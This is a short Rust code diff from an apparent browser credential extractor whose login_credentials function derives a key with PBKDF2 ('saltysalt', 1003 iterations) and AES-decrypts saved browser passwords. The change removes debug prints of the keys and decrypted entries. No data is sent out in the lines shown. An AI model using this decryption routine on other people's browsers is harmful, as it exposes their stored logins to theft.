@@ -53,16 +53,12 @@ pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
         .0
         .to_owned();
 
-    println!("Encryption key: {:?}", encryption_key);
-
     // derived key is used to decrypt the encrypted data
     let mut dk = [0u8; 16];
 
     let mut mac = Hmac::new(Sha1::new(), &encryption_key);
 
     pbkdf2(&mut mac, b"saltysalt", 1003, &mut dk);
-
-    println!("Derived key: {:?}", dk);
 
     let mut iv = [0u8; 16];
 
@@ -90,14 +86,8 @@ pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
             let username_value = row.get::<_, String>(1)?;
             let mut password_value = row.get::<_, Vec<u8>>(2)?;
 
-            if password_value.len() <= 0 {
-                continue;
-            }
-
             let decrypted_password = {
                 if password_value.len() > 0 {
-                    println!("Decrypting {}@{}: {}", username_value, origin_url, password_value.len());
-
                     // Strip over "v10" versioning prefix
                     std::str::from_utf8(cipher.clone().decrypt(&mut password_value[3..])?)
                         .map_err(|_| ExtractorError::AESCBCCannotDecryptPassword)?
